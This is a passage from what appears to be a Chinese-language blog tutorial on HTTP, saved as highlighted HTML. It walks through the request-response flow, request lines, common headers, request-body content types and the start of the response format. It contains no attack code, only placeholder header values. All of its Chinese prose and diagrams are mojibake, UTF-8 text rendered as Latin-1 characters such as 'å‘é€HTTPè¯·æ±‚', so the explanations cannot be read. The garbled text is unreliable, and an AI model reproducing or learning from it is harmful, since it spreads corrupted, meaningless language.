&lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">    3.</span> å‘é€HTTPè¯·æ±‚<br><span class="hljs-code">       GET /index.html HTTP/1.1</span><br><span class="hljs-code">       Host: www.example.com</span><br><span class="hljs-code">       â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€&gt;</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">    4.</span> æœåŠ¡å™¨å¤„ç†è¯·æ±‚<br><span class="hljs-bullet">                                  -</span> è§£æè¯·æ±‚<br><span class="hljs-bullet">                                  -</span> æŸ¥æ‰¾èµ„æº<br><span class="hljs-bullet">                                  -</span> ç”Ÿæˆå“åº”<br><br><span class="hljs-bullet">    5.</span> è¿”å›HTTPå“åº”<br><span class="hljs-code">       &lt;â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="hljs-code">       HTTP/1.1 200 OK</span><br><span class="hljs-code">       Content-Type: text/html</span><br><span class="hljs-code"></span><br><span class="hljs-code">       &lt;html&gt;...&lt;/html&gt;</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">    6.</span> å…³é—­è¿æ¥ï¼ˆHTTP/1.0ï¼‰<br><span class="hljs-code">       æˆ–ä¿æŒè¿æ¥ï¼ˆHTTP/1.1ï¼‰</span><br></code></pre></td></tr></table></figure><p><strong>è¯¦ç»†æ­¥éª¤</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ç”¨æˆ·è¾“å…¥URLï¼šhttp://www.example.com/index.html<br><br><span class="hljs-bullet">2.</span> æµè§ˆå™¨è§£æURLï¼š<br><span class="hljs-bullet">   -</span> åè®®ï¼šhttp<br><span class="hljs-bullet">   -</span> ä¸»æœºï¼šwww.example.com<br><span class="hljs-bullet">   -</span> ç«¯å£ï¼š80ï¼ˆé»˜è®¤ï¼‰<br><span class="hljs-bullet">   -</span> è·¯å¾„ï¼š/index.html<br><br><span class="hljs-bullet">3.</span> DNSæŸ¥è¯¢ï¼š<br><span class="hljs-bullet">   -</span> æŸ¥è¯¢www.example.comçš„IPåœ°å€<br><span class="hljs-bullet">   -</span> å¾—åˆ°ï¼š93.184.216.34<br><br><span class="hljs-bullet">4.</span> å»ºç«‹TCPè¿æ¥ï¼š<br><span class="hljs-bullet">   -</span> è¿æ¥åˆ° 93.184.216.34:80<br><span class="hljs-bullet">   -</span> ä¸‰æ¬¡æ¡æ‰‹<br><br><span class="hljs-bullet">5.</span> å‘é€HTTPè¯·æ±‚ï¼š<br><span class="hljs-bullet">   -</span> è¯·æ±‚è¡Œï¼šGET /index.html HTTP/1.1<br><span class="hljs-bullet">   -</span> è¯·æ±‚å¤´ï¼šHost, User-Agentç­‰<br><span class="hljs-bullet">   -</span> ç©ºè¡Œ<br><span class="hljs-bullet">   -</span> è¯·æ±‚ä½“ï¼ˆå¦‚æœæœ‰ï¼‰<br><br><span class="hljs-bullet">6.</span> æœåŠ¡å™¨å¤„ç†ï¼š<br><span class="hljs-bullet">   -</span> è§£æè¯·æ±‚<br><span class="hljs-bullet">   -</span> æ‰¾åˆ°/index.htmlæ–‡ä»¶<br><span class="hljs-bullet">   -</span> è¯»å–æ–‡ä»¶å†…å®¹<br><br><span class="hljs-bullet">7.</span> å‘é€HTTPå“åº”ï¼š<br><span class="hljs-bullet">   -</span> çŠ¶æ€è¡Œï¼šHTTP/1.1 200 OK<br><span class="hljs-bullet">   -</span> å“åº”å¤´ï¼šContent-Type, Content-Lengthç­‰<br><span class="hljs-bullet">   -</span> ç©ºè¡Œ<br><span class="hljs-bullet">   -</span> å“åº”ä½“ï¼ˆHTMLå†…å®¹ï¼‰<br><br><span class="hljs-bullet">8.</span> æµè§ˆå™¨æ¸²æŸ“ï¼š<br><span class="hljs-bullet">   -</span> è§£æHTML<br><span class="hljs-bullet">   -</span> åŠ è½½CSSã€JavaScriptã€å›¾ç‰‡ç­‰<br><span class="hljs-bullet">   -</span> æ¸²æŸ“é¡µé¢<br></code></pre></td></tr></table></figure><h3 id="1-3-HTTPç‰¹ç‚¹"><a href="#1-3-HTTPç‰¹ç‚¹" class="headerlink" title="1.3 HTTPç‰¹ç‚¹"></a>1.3 HTTPç‰¹ç‚¹</h3><p><strong>æ— çŠ¶æ€ï¼ˆStatelessï¼‰</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç‰¹ç‚¹ï¼š<br>æœåŠ¡å™¨ä¸ä¼šè®°ä½ä¹‹å‰çš„è¯·æ±‚<br><br>ç”Ÿæ´»ç±»æ¯”ï¼š<br>ä½ æ¯æ¬¡å»é“¶è¡Œå–é’±ï¼ŒæŸœå‘˜éƒ½ä¸è®¤è¯†ä½ <br>æ¯æ¬¡éƒ½è¦é‡æ–°éªŒè¯èº«ä»½<br><br>é—®é¢˜ï¼š<br><span class="hljs-bullet">- </span>æ— æ³•è¯†åˆ«ç”¨æˆ·<br><span class="hljs-bullet">- </span>æ— æ³•ä¿æŒç™»å½•çŠ¶æ€<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-bullet">- </span>Cookie<br><span class="hljs-bullet">- </span>Session<br><span class="hljs-bullet">- </span>Token<br></code></pre></td></tr></table></figure><p><strong>æ˜æ–‡ä¼ è¾“</strong>ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs">ä¼˜ç‚¹ï¼š<br>âœ… æ˜“äºè°ƒè¯•<br>âœ… ä¸­é—´è®¾å¤‡å¯ä»¥ç¼“å­˜<br>âœ… ç®€å•ç›´è§‚<br><br>ç¼ºç‚¹ï¼š<br>âŒ ä¸å®‰å…¨ï¼ˆå¯è¢«çªƒå¬ï¼‰<br>âŒ æ•æ„Ÿä¿¡æ¯æš´éœ²<br><br>è§£å†³æ–¹æ¡ˆï¼š<br>ä½¿ç”¨HTTPSï¼ˆHTTP + TLS/SSLï¼‰<br></code></pre></td></tr></table></figure><p><strong>è¯·æ±‚-å“åº”æ¨¡å¼</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">ç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>å®¢æˆ·ç«¯ä¸»åŠ¨å‘èµ·è¯·æ±‚<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨è¢«åŠ¨å“åº”<br><span class="hljs-bullet">- </span>ä¸€ä¸ªè¯·æ±‚å¯¹åº”ä¸€ä¸ªå“åº”<br><br>é™åˆ¶ï¼š<br><span class="hljs-bullet">- </span>æœåŠ¡å™¨æ— æ³•ä¸»åŠ¨æ¨é€<br><span class="hljs-bullet">- </span>å®æ—¶æ€§è¾ƒå·®<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-bullet">- </span>é•¿è½®è¯¢ï¼ˆLong Pollingï¼‰<br><span class="hljs-bullet">- </span>WebSocket<br><span class="hljs-bullet">- </span>Server-Sent Events (SSE)<br></code></pre></td></tr></table></figure><hr><h2 id="2-HTTPè¯·æ±‚æ ¼å¼"><a href="#2-HTTPè¯·æ±‚æ ¼å¼" class="headerlink" title="2. HTTPè¯·æ±‚æ ¼å¼"></a>2. HTTPè¯·æ±‚æ ¼å¼</h2><h3 id="2-1-è¯·æ±‚æ ¼å¼æ¦‚è§ˆ"><a href="#2-1-è¯·æ±‚æ ¼å¼æ¦‚è§ˆ" class="headerlink" title="2.1 è¯·æ±‚æ ¼å¼æ¦‚è§ˆ"></a>2.1 è¯·æ±‚æ ¼å¼æ¦‚è§ˆ</h3><p><strong>å®Œæ•´çš„HTTPè¯·æ±‚</strong>ï¼š</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">GET <span class="hljs-symbol">/index.html</span> HTTP<span class="hljs-symbol">/1.1</span>              â† è¯·æ±‚è¡Œ<br><span class="hljs-params">Host:</span> www.example.com                 â† è¯·æ±‚å¤´<br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span>               â† è¯·æ±‚å¤´<br><span class="hljs-params">Accept:</span> text<span class="hljs-symbol">/html</span>                     â† è¯·æ±‚å¤´<br><span class="hljs-params">Connection:</span> keep-alive                â† è¯·æ±‚å¤´<br>                                      â† ç©ºè¡Œï¼ˆCRLFï¼‰<br>[è¯·æ±‚ä½“ï¼Œå¦‚æœæœ‰çš„è¯]                   â† è¯·æ±‚ä½“<br></code></pre></td></tr></table></figure><p><strong>ç»“æ„</strong>ï¼š</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  è¯·æ±‚è¡Œï¼ˆ<span class="hljs-built_in">Request</span> Lineï¼‰         â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  è¯·æ±‚å¤´ï¼ˆ<span class="hljs-built_in">Request</span> Headersï¼‰      â”‚<br>â”‚  ...                           â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç©ºè¡Œï¼ˆCRLFï¼‰                   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  è¯·æ±‚ä½“ï¼ˆ<span class="hljs-built_in">Request</span> Bodyï¼‰         â”‚<br>â”‚  ï¼ˆå¯é€‰ï¼Œ<span class="hljs-keyword">GET</span>è¯·æ±‚é€šå¸¸æ²¡æœ‰ï¼‰       â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="2-2-è¯·æ±‚è¡Œ"><a href="#2-2-è¯·æ±‚è¡Œ" class="headerlink" title="2.2 è¯·æ±‚è¡Œ"></a>2.2 è¯·æ±‚è¡Œ</h3><p><strong>æ ¼å¼</strong>ï¼š</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">æ–¹æ³• URI HTTPç‰ˆæœ¬<br><br>ç¤ºä¾‹ï¼š<br>GET <span class="hljs-symbol">/index.html</span> HTTP<span class="hljs-symbol">/1.1</span><br>POST <span class="hljs-symbol">/api/login</span> HTTP<span class="hljs-symbol">/1.1</span><br>PUT <span class="hljs-symbol">/api/users/123</span> HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure><p><strong>ç»„æˆéƒ¨åˆ†</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> æ–¹æ³•ï¼ˆMethodï¼‰<br><span class="hljs-bullet">   -</span> GETï¼šè·å–èµ„æº<br><span class="hljs-bullet">   -</span> POSTï¼šæäº¤æ•°æ®<br><span class="hljs-bullet">   -</span> PUTï¼šæ›´æ–°èµ„æº<br><span class="hljs-bullet">   -</span> DELETEï¼šåˆ é™¤èµ„æº<br><span class="hljs-bullet">   -</span> HEADï¼šè·å–å¤´éƒ¨<br><span class="hljs-bullet">   -</span> OPTIONSï¼šæŸ¥è¯¢æ”¯æŒçš„æ–¹æ³•<br><span class="hljs-bullet">   -</span> TRACEï¼šè¿½è¸ªè¯·æ±‚<br><span class="hljs-bullet">   -</span> CONNECTï¼šå»ºç«‹éš§é“<br><br><span class="hljs-bullet">2.</span> URIï¼ˆç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼‰<br><span class="hljs-bullet">   -</span> è·¯å¾„ï¼š/index.html<br><span class="hljs-bullet">   -</span> æŸ¥è¯¢å‚æ•°ï¼š?name=Alice&amp;age=20<br><span class="hljs-bullet">   -</span> ç‰‡æ®µï¼š#section1ï¼ˆä¸å‘é€åˆ°æœåŠ¡å™¨ï¼‰<br><br><span class="hljs-bullet">3.</span> HTTPç‰ˆæœ¬<br><span class="hljs-bullet">   -</span> HTTP/1.0ï¼šæ—©æœŸç‰ˆæœ¬<br><span class="hljs-bullet">   -</span> HTTP/1.1ï¼šå½“å‰ä¸»æµ<br><span class="hljs-bullet">   -</span> HTTP/2ï¼šäºŒè¿›åˆ¶åè®®<br><span class="hljs-bullet">   -</span> HTTP/3ï¼šåŸºäºQUIC<br></code></pre></td></tr></table></figure><h3 id="2-3-è¯·æ±‚å¤´"><a href="#2-3-è¯·æ±‚å¤´" class="headerlink" title="2.3 è¯·æ±‚å¤´"></a>2.3 è¯·æ±‚å¤´</h3><p><strong>å¸¸ç”¨è¯·æ±‚å¤´</strong>ï¼š</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">www.example.com</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">æŒ‡å®šæœåŠ¡å™¨åŸŸåï¼ˆå¿…éœ€ï¼‰</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">HTTP/1.1è¦æ±‚å¿…é¡»æœ‰</span><br><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">å®¢æˆ·ç«¯ä¿¡æ¯ï¼ˆæµè§ˆå™¨ã€æ“ä½œç³»ç»Ÿï¼‰</span><br><br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">text/html,application/json</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">å®¢æˆ·ç«¯å¯æ¥å—çš„å†…å®¹ç±»å‹</span><br><br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate, br</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">å®¢æˆ·ç«¯æ”¯æŒçš„å‹ç¼©æ ¼å¼</span><br><br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.9,en;q=0.8</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">å®¢æˆ·ç«¯é¦–é€‰è¯­è¨€</span><br><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">keep-alive</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">è¿æ¥ç®¡ç†</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">keep-aliveï¼šä¿æŒè¿æ¥</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">closeï¼šå…³é—­è¿æ¥</span><br><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">è¯·æ±‚ä½“çš„MIMEç±»å‹</span><br><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">123</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">è¯·æ±‚ä½“çš„é•¿åº¦ï¼ˆå­—èŠ‚ï¼‰</span><br><br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">session_id=abc123; user=Alice</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">å‘é€Cookieç»™æœåŠ¡å™¨</span><br><br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Bearer eyJhbGc...</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">èº«ä»½è®¤è¯ä¿¡æ¯</span><br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">https://www.google.com/</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">æ¥æºé¡µé¢ï¼ˆä»å“ªä¸ªé¡µé¢è·³è½¬ï¼‰</span><br><br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">:</span> <span class="hljs-string">no-cache</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">ç¼“å­˜æ§åˆ¶</span><br><br><span class="hljs-attribute">If-Modified-Since</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Wed, 21 Oct 2015 07:28:00 GMT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">æ¡ä»¶è¯·æ±‚ï¼ˆåªåœ¨ä¿®æ”¹åæ‰è¿”å›ï¼‰</span><br></code></pre></td></tr></table></figure><h3 id="2-4-è¯·æ±‚ä½“"><a href="#2-4-è¯·æ±‚ä½“" class="headerlink" title="2.4 è¯·æ±‚ä½“"></a>2.4 è¯·æ±‚ä½“</h3><p><strong>ä½•æ—¶æœ‰è¯·æ±‚ä½“</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æœ‰è¯·æ±‚ä½“çš„æ–¹æ³•ï¼š<br><span class="hljs-bullet">- </span>POSTï¼šæäº¤è¡¨å•ã€ä¸Šä¼ æ–‡ä»¶<br><span class="hljs-bullet">- </span>PUTï¼šæ›´æ–°èµ„æº<br><span class="hljs-bullet">- </span>PATCHï¼šéƒ¨åˆ†æ›´æ–°<br><br>æ²¡æœ‰è¯·æ±‚ä½“çš„æ–¹æ³•ï¼š<br><span class="hljs-bullet">- </span>GETï¼šé€šè¿‡URLä¼ å‚<br><span class="hljs-bullet">- </span>DELETEï¼šé€šå¸¸ä¸éœ€è¦<br><span class="hljs-bullet">- </span>HEADï¼šåªè¦å¤´éƒ¨<br></code></pre></td></tr></table></figure><p><strong>å¸¸è§Content-Type</strong>ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> application/x-www-form-urlencodedï¼ˆè¡¨å•é»˜è®¤ï¼‰<br>   Content-<span class="hljs-keyword">Type</span>: application/x-www-form-urlencoded<br><br>   è¯·æ±‚ä½“ï¼š<br>   <span class="hljs-type">name</span>=Alice&amp;age=<span class="hljs-number">20</span>&amp;email=alice@example.com<br><br><span class="hljs-number">2.</span> application/<span class="hljs-type">json</span>ï¼ˆAPIå¸¸ç”¨ï¼‰<br>   Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span><br><br>   è¯·æ±‚ä½“ï¼š<br>   &#123;<br>       &quot;name&quot;: &quot;Alice&quot;,<br>       &quot;age&quot;: <span class="hljs-number">20</span>,<br>       &quot;email&quot;: &quot;alice@example.com&quot;<br>   &#125;<br><br><span class="hljs-number">3.</span> multipart/form-dataï¼ˆæ–‡ä»¶ä¸Šä¼ ï¼‰<br>   Content-<span class="hljs-keyword">Type</span>: multipart/form-data; boundary=<span class="hljs-comment">----WebKitFormBoundary</span><br><br>   è¯·æ±‚ä½“ï¼š<br>   <span class="hljs-comment">------WebKitFormBoundary</span><br>   Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;file&quot;; filename=&quot;photo.jpg&quot;<br>   Content-<span class="hljs-keyword">Type</span>: image/jpeg<br><br>   [äºŒè¿›åˆ¶æ–‡ä»¶å†…å®¹]<br>   <span class="hljs-comment">------WebKitFormBoundary--</span><br><br><span class="hljs-number">4.</span> <span class="hljs-type">text</span>/plainï¼ˆçº¯æ–‡æœ¬ï¼‰<br>   Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain<br><br>   è¯·æ±‚ä½“ï¼š<br>   Hello, this <span class="hljs-keyword">is</span> plain <span class="hljs-type">text</span>.<br><br><span class="hljs-number">5.</span> application/<span class="hljs-type">xml</span>ï¼ˆ<span class="hljs-type">XML</span>æ•°æ®ï¼‰<br>   Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">xml</span><br><br>   è¯·æ±‚ä½“ï¼š<br>   &lt;?<span class="hljs-type">xml</span> version=&quot;1.0&quot;?&gt;<br>   &lt;<span class="hljs-keyword">user</span>&gt;<br>       &lt;<span class="hljs-type">name</span>&gt;Alice&lt;/<span class="hljs-type">name</span>&gt;<br>       &lt;age&gt;<span class="hljs-number">20</span>&lt;/age&gt;<br>   &lt;/<span class="hljs-keyword">user</span>&gt;<br></code></pre></td></tr></table></figure><hr><h2 id="3-HTTPå“åº”æ ¼å¼"><a href="#3-HTTPå“åº”æ ¼å¼" class="headerlink" title="3. HTTPå“åº”æ ¼å¼"></a>3. HTTPå“åº”æ ¼å¼</h2><h3 id="3-1-å“åº”æ ¼å¼æ¦‚è§ˆ"><a href="#3-1-å“åº”æ ¼å¼æ¦‚è§ˆ" class="headerlink" title="3.1 å“åº”æ ¼å¼æ¦‚è§ˆ"></a>3.1 å“åº”æ ¼å¼æ¦‚è§ˆ</h3><p><strong>å®Œæ•´çš„HTTPå“åº”</strong>ï¼š</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix">HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">200</span> OK                       â† çŠ¶æ€è¡Œ<br><span class="hljs-params">Content-Type:</span> text<span class="hljs-symbol">/html</span>               â† å“åº”å¤´<br><span class="hljs-params">Content-Length:</span> <span class="hljs-number">1234</span>                  â† å“åº”å¤´<br><span class="hljs-params">Date:</span> Mon, <span class="hljs-number">15</span> Jan <span class="hljs-number">2024</span> <span class="hljs-number">10</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT  â† å“åº”å¤´<br><span class="hljs-params">Server:</span> nginx<span class="hljs-symbol">/1.18.0</span>                  â† å“åº”å¤´<br>                                      â† ç©ºè¡Œï¼ˆCRLFï¼‰<br><span class="hljs-symbol">&lt;html&gt;</span>                                â† å“åº”ä½“<br>  <span class="hljs-symbol">&lt;body&gt;</span>Hello World<span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>body<span class="hljs-operator">&gt;</span><br><span class="hljs-operator">&lt;</span><span class="hljs-operator">/</span>html<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure><p><strong>ç»“æ„</strong>ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  çŠ¶æ€è¡Œï¼ˆStatus <span class="hljs-selector-tag">Line</span>ï¼‰          â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  å“åº”å¤´ï¼ˆResponse Headersï¼‰     â”‚<br>â”‚  ...                           â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç©ºè¡Œï¼ˆCRLFï¼‰                   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  å“åº”ä½“ï¼ˆResponse <span class="hljs-selector-tag">Body</span>ï¼‰        